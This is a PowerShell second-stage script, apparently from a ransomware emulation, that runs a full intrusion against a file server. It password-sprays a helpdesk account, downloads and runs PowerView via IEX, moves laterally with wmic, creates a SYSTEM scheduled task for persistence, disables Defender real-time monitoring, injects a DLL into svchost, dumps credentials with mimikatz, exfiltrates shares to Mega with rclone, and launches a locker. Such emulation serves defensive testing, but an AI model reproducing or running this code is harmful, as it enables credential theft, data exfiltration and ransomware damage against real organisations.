# c0015_stage2.ps1 — everything after the SYSTEM beacon, run by the stager as SYSTEM.
#
# Sequence: spray a weak helpdesk account, pivot to the backup server with that credential, keep a
# foothold, inject the loader into the per-user service host, collect credentials, exfiltrate, impact.
# Every command that has to run on the target is written to a .cmd file during staging, so nothing
# compound ever passes through wmic or schtasks quoting.

$ErrorActionPreference = 'Continue'
$base   = 'http://192.168.50.100'
$work   = 'C:\ProgramData\C0015'
$log    = Join-Path $work 'stage2.log'
$stage  = 'C:\Users\Public\C0015'
$target = 'FS01'
$user   = 'C0015\helpdesk'
$cands  = @('Password123!', 'Helpdesk2026!', 'Welcome1!', 'Summer2026!')

function W($s) { Add-Content -Path $log -Value ("{0} {1}" -f (Get-Date -Format 'HH:mm:ss'), $s) }
New-Item -ItemType Directory -Force -Path $work, $stage | Out-Null
W "=== stage2 start as $(whoami) ==="

function Get-Staged($name, $dest) {
    try { Invoke-WebRequest -Uri "$base/$name" -OutFile $dest -UseBasicParsing -TimeoutSec 180; W "fetched $name"; $true }
    catch { W "fetch $name failed: $($_.Exception.Message)"; $false }
}

function Invoke-Remote($cmd, $label) {
    $out = & cmd.exe /c "wmic /node:$target /user:$user /password:$pw process call create `"$cmd`"" 2>&1
    $rv = ($out | Select-String 'ReturnValue') -join ' '
    W "remote task: $label -> $rv"
    Start-Sleep -Seconds 3
}

Get-Staged 'inj.dll'       (Join-Path $stage 'inj.dll')       | Out-Null
Get-Staged 'D8B3.bin'      (Join-Path $stage 'D8B3.bin')      | Out-Null
Get-Staged 'mk.exe'        (Join-Path $work  'mk.exe')        | Out-Null
Get-Staged 'rclone.exe'    (Join-Path $work  'rclone.exe')    | Out-Null
Get-Staged 'rclone.conf'   (Join-Path $work  'rclone.conf')   | Out-Null
Get-Staged '143.dll'       (Join-Path $work  '143.dll')       | Out-Null
Get-Staged 'locker.exe'    (Join-Path $work  'locker.exe')    | Out-Null
Get-Staged 'readme.txt'    (Join-Path $work  'readme.txt')    | Out-Null
Get-Staged 'PowerView.ps1' (Join-Path $work  'PowerView.ps1') | Out-Null

# ---------------------------------------------------------------- spray the helpdesk account
$pw = $null
foreach ($c in $cands) {
    & cmd.exe /c "net use \\WS01\IPC$ /user:$user $c" 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) { $pw = $c; W "spray hit: $c"; break }
    & cmd.exe /c "net use \\WS01\IPC$ /delete /y" 2>&1 | Out-Null
}
if (-not $pw) { W 'spray failed' } else {
    & cmd.exe /c "net use \\DC01\IPC$ /user:$user $pw" 2>&1 | Out-Null
    W 'domain logon with the recovered password'
}

if ($pw) {
    # ------------------------------------------------------------ discovery and share enumeration
    $disc = Join-Path $work 'discovery.txt'
    $discCmd = Join-Path $work 'disc.cmd'
    @"
@echo off
echo === whoami === >> "$disc"
whoami >> "$disc" 2>&1
echo === trusts === >> "$disc"
nltest /domain_trusts /all_trusts >> "$disc" 2>&1
echo === domain admins === >> "$disc"
net group "domain admins" /dom >> "$disc" 2>&1
echo === local admins === >> "$disc"
net localgroup "administrator" >> "$disc" 2>&1
echo === domain view === >> "$disc"
net view /all /domain >> "$disc" 2>&1
echo === hosts === >> "$disc"
net view /all >> "$disc" 2>&1
echo === target processes === >> "$disc"
tasklist /s $target /u $user /p $pw >> "$disc" 2>&1
echo === time === >> "$disc"
time /t >> "$disc" 2>&1
echo === reachability === >> "$disc"
ping -n 2 $target >> "$disc" 2>&1
"@ | Set-Content $discCmd -Encoding ASCII
    & cmd.exe /c $discCmd
    W 'discovery written'
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.Webclient).DownloadString('$base/PowerView.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose" 2>&1 | Out-File (Join-Path $work 'sharefind.out') -Encoding ascii
    W 'share enumeration done'

    # ------------------------------------------------------------ stage everything on the target
    & cmd.exe /c "net use \\$target\C$ /user:$user $pw" 2>&1 | Out-Null
    if (Test-Path "\\$target\C$") {
        $c = "\\$target\C$"
        Copy-Item (Join-Path $work '143.dll')    "$c\ProgramData\143.dll" -Force
        Copy-Item (Join-Path $work 'mk.exe')     "$c\ProgramData\mk.exe"  -Force
        Copy-Item (Join-Path $work 'readme.txt') "$c\readme.txt" -Force
        Copy-Item (Join-Path $work 'locker.exe') "$c\ProgramData\locker.exe" -Force
        Set-Content "$c\ProgramData\dump.cmd" "C:\ProgramData\mk.exe privilege::debug sekurlsa::logonpasswords exit > C:\ProgramData\dump.txt 2>&1" -Encoding ASCII
        Set-Content "$c\ProgramData\inject.cmd" "C:\Windows\System32\rundll32.exe C:\ProgramData\inj.dll,Run" -Encoding ASCII
        Set-Content "$c\locker.bat" "@echo off`r`nC:\ProgramData\locker.exe -m -net -size 10 -nomutex -p \\$target\C$" -Encoding ASCII
        W 'files and command files staged'
    } else { W "C$ on $target not reachable" }

    # ------------------------------------------------------------ loader on the target
    Invoke-Remote "rundll32.exe C:\ProgramData\143.dll DllRegisterServer" 'loader'

    # ------------------------------------------------------------ foothold
    $task = & cmd.exe /c "schtasks /create /s $target /u $user /p $pw /tn C0015Persist /tr `"cmd.exe /c C:\ProgramData\143.dll`" /sc onstart /ru SYSTEM /rl HIGHEST /f" 2>&1
    W ("persistence: " + (($task | Select-Object -First 1) -join ' '))

    # ------------------------------------------------------------ defence for the dump (lab)
    Invoke-Remote "powershell.exe -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring `$true" 'defence relaxed'

    # ------------------------------------------------------------ inject into the per-user service host
    $injected = $false
    for ($i = 0; $i -lt 18 -and -not $injected; $i++) {
        $rows = & cmd.exe /c "wmic /node:$target /user:$user /password:$pw process where `"name='svchost.exe'`" get ProcessId,CommandLine /format:list" 2>&1
        $cur = $null
        foreach ($line in $rows) {
            if ($line -match '^ProcessId=(\d+)') { $cur = $Matches[1] }
            elseif ($line -match 'UnistackSvcGroup' -and $cur) {
                Set-Content "\\$target\C$\Users\Public\C0015\target.txt" $cur -Encoding ASCII
                Copy-Item (Join-Path $stage 'D8B3.bin') "\\$target\C$\Users\Public\C0015\D8B3.bin" -Force
                Copy-Item (Join-Path $stage 'inj.dll')  "\\$target\C$\Windows\System32\inj.dll" -Force -ErrorAction SilentlyContinue
                Invoke-Remote "C:\ProgramData\inject.cmd" "injection into $cur"
                W "injected into UnistackSvcGroup $cur"
                $injected = $true
                break
            }
        }
        if (-not $injected) { Start-Sleep -Seconds 10 }
    }
    if (-not $injected) { W 'no per-user service host found; skipped injection' }

    # ------------------------------------------------------------ credential collection
    Invoke-Remote "C:\ProgramData\dump.cmd" 'credential dump'

    # ------------------------------------------------------------ exfiltration
    & cmd.exe /c "net use \\$target\Shares /user:$user $pw" 2>&1 | Out-Null
    & (Join-Path $work 'rclone.exe') --config (Join-Path $work 'rclone.conf') copy --max-age 2y "\\$target\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M 2>&1 | Out-Null
    W 'rclone finished'

    # ------------------------------------------------------------ impact
    Invoke-Remote "cmd.exe /c C:\locker.bat" 'locker'
}

W "=== stage2 end ==="

